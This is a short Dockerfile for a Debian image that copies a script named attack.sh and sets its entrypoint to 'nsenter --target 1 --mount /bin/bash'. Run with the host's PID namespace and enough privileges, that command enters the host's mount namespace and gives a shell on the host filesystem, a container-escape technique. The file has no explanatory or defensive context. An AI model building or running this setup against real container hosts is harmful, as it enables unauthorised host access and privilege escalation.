FROM debian:latest
MAINTAINER Fani Dimou <fani.dimou92@gmail.com>

COPY attack.sh /
ENTRYPOINT nsenter --target 1 --mount /bin/bash
